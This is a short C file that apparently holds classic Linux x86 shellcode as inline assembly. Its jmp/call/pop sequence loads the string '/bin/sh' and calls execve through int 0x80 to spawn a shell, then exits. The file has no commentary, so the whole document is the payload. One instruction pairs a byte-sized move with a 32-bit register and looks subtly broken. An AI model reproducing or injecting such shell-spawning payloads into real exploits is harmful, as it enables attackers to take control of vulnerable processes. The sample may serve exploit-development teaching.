void main(){
__asm__(
"jmp call123;"
"pop1: popl %esi;"
"xorl %eax, %eax;"
"movl %eax, %ecx;"
"movl %eax, %edx;"
"movl %esi, %ebx;"
"movb $0xb, %eax;"
"int $0x80;"
"xorl %ebx, %ebx;"
"movl   %ebx,%eax;"
"inc    %eax;"
"int    $0x80;"
"call123: call   pop1;"
".string \"/bin/sh\";"
);
}
